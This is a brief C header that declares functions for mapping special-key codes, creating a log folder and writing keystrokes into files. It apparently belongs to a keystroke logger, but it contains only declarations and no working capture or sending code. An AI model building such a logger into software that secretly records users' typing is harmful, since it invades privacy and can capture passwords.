#include <stdio.h>

// Virtual key codes for special keys
/* http://kbdedit.com/manual/low_level_vk_list.html */
extern int specialKeys[];

// Special keys functions
int CheckSpecialKey(int data);
char* SpecialKeyToReadable(int data);


// File writing functions
int CheckLogFolder(const char *chemin);
void CreateLogFolder(const char *chemin);
void WriteIntoFile(char data, const char* filePath);
void WriteSpecialKeyIntoFile(char *data, const char* filePath);